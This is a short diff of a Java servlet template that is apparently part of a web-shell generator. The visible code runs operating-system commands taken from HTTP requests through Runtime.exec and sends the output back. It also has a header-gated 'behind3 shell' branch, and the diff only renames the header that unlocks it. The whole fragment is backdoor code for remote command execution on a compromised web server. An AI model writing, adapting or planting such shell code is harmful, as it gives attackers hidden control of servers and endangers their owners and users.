@@ -30,7 +30,7 @@ public class ServletTemplate extends HttpServlet {
                 String result = new Scanner(Runtime.getRuntime().exec(cmds).getInputStream()).useDelimiter("\\A").next();
                 response.getWriter().println(result);
             }
-        }else if(request.getHeader(Config.getPassword()) != null){
+        }else if(request.getHeader(Config.getHeader()) != null){
             //behind3 shell
             try{
                 if (request.getMethod().equals("POST")){
